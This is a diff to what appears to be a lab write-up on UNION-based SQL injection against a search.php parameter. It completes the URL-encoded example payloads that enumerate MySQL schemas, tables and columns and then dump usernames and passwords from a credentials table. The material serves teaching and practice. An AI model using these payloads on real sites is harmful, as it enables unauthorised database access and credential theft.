@@ -106,7 +106,6 @@ Query:
 
 ```sql
 SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
-
 ```
 
 Output:
@@ -121,7 +120,6 @@ Copy code+--------------------+
 | ilfreight          |
 | dev                |
 +--------------------+
-
 ```
 
 Note: The first three databases are default MySQL databases and can be ignored during enumeration.
@@ -133,7 +131,6 @@ Payload:
 
 ```sql
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
-
 ```
 
 Example URL:
@@ -158,14 +155,12 @@ Payload:
 
 ```sql
 cn' UNION select 1,database(),2,3-- -
-
 ```
 
 Example URL:
 
 ```sql
 http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2Cdatabase()%2C2%2C3--+-
-
 ```
 
 Output:
@@ -194,7 +189,6 @@ Payload:
 
 ```sql
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
-
 ```
 
 Note:
@@ -207,8 +201,7 @@ Note:
 Example URL:
 
 ```sql
-http://SERVER_IP:PORT/search.php?port_code=cn
-
+http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2CTABLE_NAME%2CTABLE_SCHEMA%2C4+from+INFORMATION_SCHEMA.TABLES+where+table_schema%3D'dev'--+-
 ```
 
 Output:
@@ -235,14 +228,12 @@ Payload:
 
 ```sql
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
-
 ```
 
 Example URL:
 
 ```sql
-http://SERVER_IP:PORT/search.php?port_code=cn
-
+http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2CCOLUMN_NAME%2CTABLE_NAME%2CTABLE_SCHEMA+from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3D'credentials'--+-
 ```
 
 Output:
@@ -263,7 +254,6 @@ Payload:
 
 ```sql
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
-
 ```
 
 Note: Use the dot operator to refer to the "credentials" table in the "dev" database
@@ -271,8 +261,7 @@ Note: Use the dot operator to refer to the "credentials" table in the "dev" data
 Example URL:
 
 ```sql
-http://SERVER_IP:PORT/search.php?port_code=cn
-
+http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2C+username%2C+password%2C+4+from+dev.credentials--+-
 ```
 
 Output:
